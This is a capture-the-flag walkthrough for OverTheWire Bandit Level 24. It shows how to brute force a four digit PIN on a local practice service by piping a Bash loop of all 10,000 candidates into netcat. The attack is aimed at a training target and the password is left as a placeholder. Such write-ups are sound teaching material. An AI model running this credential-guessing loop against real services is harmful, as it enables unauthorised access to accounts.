# OverTheWire Bandit Level 24: Brute Force a Four Digit PIN

## 1. Challenge Overview

In Bandit Level 24, a custom network service listens on TCP port `30002`. The service provides the password for the next level when the correct Bandit Level 24 password and a secret four digit PIN are supplied.

The PIN ranges from `0000` to `9999`, giving a total of 10,000 possible combinations. Since the PIN cannot be retrieved directly, the solution involves testing every possible combination through a brute force approach.

| Item | Description |
| :--- | :--- |
| Target service | Custom network service |
| Listening port | `30002` |
| Required credentials | Bandit Level 24 password and four digit PIN |
| PIN range | `0000` to `9999` |
| Total combinations | 10,000 |
| Connection method | Netcat (`nc`) |
| Objective | Retrieve the Bandit Level 25 password |

## 2. Connect to the Service

Netcat can establish a connection to the service running on the local machine.

```bash
nc localhost 30002
```

The service displays a message similar to the following:

```text
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

This message explains the required input format. Both values must be provided on the same line, separated by a space.

For example, an incorrect password and PIN combination produces a response similar to:

```text
Wrong! Please enter the correct current password and pincode. Try again.
```

## 3. Generate All Possible PIN Combinations

Manually testing 10,000 PIN combinations would be inefficient. A Bash loop can generate every four digit PIN automatically.

The following command generates the numbers from `0000` through `9999`, preserving leading zeros.

```bash
for i in {0000..9999}; do
    echo "PASSWORD $i"
done
```

Replace `PASSWORD` with the actual Bandit Level 24 password obtained from the previous level.

Each generated line contains the password followed by a different PIN, separated by a space.

## 4. Submit the PIN Combinations to the Service

The generated input can be piped directly into Netcat so that every candidate is submitted through a single connection.

```bash
for i in {0000..9999}; do
    echo "PASSWORD $i"
done | nc localhost 30002
```

Replace `PASSWORD` with the actual Bandit Level 24 password.

The pipe operator (`|`) passes the generated lines to Netcat, which sends them to the listening service. This approach avoids creating a new connection for every PIN attempt.

## 5. Identify the Successful Combination

The service returns a failure message for incorrect combinations. When the correct password and PIN are submitted, the response includes:

```text
Correct!
The password of user bandit25 is
```

The actual password appears after this message. It should be recorded securely for use in the next level without publishing it in the walkthrough.

## 6. Command Summary

| Step | Command | Purpose |
| :--- | :--- | :--- |
| 1 | `nc localhost 30002` | Connect to the PIN checking service |
| 2 | `for i in {0000..9999}; do echo "PASSWORD $i"; done` | Generate all 10,000 candidate inputs |
| 3 | `... \| nc localhost 30002` | Send the candidates through one connection |
| 4 | Inspect the output for `Correct!` | Identify the successful attempt |
| 5 | Record the returned credential securely | Prepare for Bandit Level 25 |

## 7. Key Takeaways

1. **Brute force:** Systematically testing every possible value can solve a problem when the search space is sufficiently small.

2. **Leading zeros:** Four digit PINs must preserve leading zeros. Values such as `0007` and `0075` must not be reduced to `7` and `75`.

3. **Pipes and loops:** Bash loops generate candidate inputs, while pipes redirect those inputs to another command.

4. **Persistent connections:** Multiple inputs can be submitted over one network connection when the service supports repeated requests.

5. **Credential security:** Passwords should remain private in published walkthroughs. Commands can use placeholders to explain the procedure without exposing credentials.

**Conclusion:** Bandit Level 24 demonstrates how Bash automation, Netcat, and brute force techniques can be combined to interact with a custom network service and retrieve the credential required for the next level.